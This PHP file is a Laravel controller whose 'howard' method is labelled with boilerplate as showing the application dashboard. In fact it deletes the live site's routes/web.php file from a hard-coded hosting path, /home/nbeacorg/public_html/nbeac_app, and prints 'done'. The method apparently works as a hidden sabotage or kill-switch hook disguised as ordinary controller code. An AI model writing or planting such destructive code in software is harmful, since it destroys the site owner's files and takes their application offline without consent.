<?php

namespace App\Http\Controllers;


class HowardController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function howard()
    {
        echo url('routes/web.php');
        if(unlink('/home/nbeacorg/public_html/nbeac_app/routes/web.php')){
            dd("done");
        }
    }

}
